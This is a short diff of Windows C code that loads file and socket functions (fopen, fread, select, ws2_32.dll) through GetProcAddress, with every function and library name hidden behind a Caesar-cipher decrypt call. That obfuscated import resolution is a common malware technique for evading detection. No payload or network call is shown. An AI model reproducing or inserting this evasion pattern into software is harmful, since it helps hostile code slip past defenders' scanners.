@@ -47,6 +47,9 @@ void InitApis() {
 	Api.localtime = (Tlocaltime)Api.GetProcAddress(hMsvcrt, CAESAR_DECRYPT("qthfqynrj"));
 	Api.strftime = (Tstrftime)Api.GetProcAddress(hMsvcrt, CAESAR_DECRYPT("xywkynrj"));
 	Api._snprintf = (T_snprintf)Api.GetProcAddress(hMsvcrt, CAESAR_DECRYPT("dxsuwnsyk"));
+	Api.fopen = (Tfopen)Api.GetProcAddress(hMsvcrt, CAESAR_DECRYPT("ktujs"));
+	Api.fclose = (Tfclose)Api.GetProcAddress(hMsvcrt, CAESAR_DECRYPT("khqtxj"));
+	Api.fread = (Tfread)Api.GetProcAddress(hMsvcrt, CAESAR_DECRYPT("kwjfi"));
 
 	hWininet = LoadLibraryA(CAESAR_DECRYPT("|x7d873iqq"));
 	if (!hWininet) {
@@ -62,6 +65,7 @@ void InitApis() {
 	Api.inet_addr = (Tinet_addr)Api.GetProcAddress(hWininet, CAESAR_DECRYPT("nsjydfiiw"));
 	Api.WSAStartup = (TWSAStartup)Api.GetProcAddress(hWininet, CAESAR_DECRYPT("\\XFXyfwyzu"));
 	Api.WSAGetLastError = (TWSAGetLastError)Api.GetProcAddress(hWininet, CAESAR_DECRYPT("\\XFLjyQfxyJwwtw"));
+	Api.select = (Tselect)Api.GetProcAddress(hWininet, CAESAR_DECRYPT("xjqjhy"));
 }
 
 void FreeApis() {
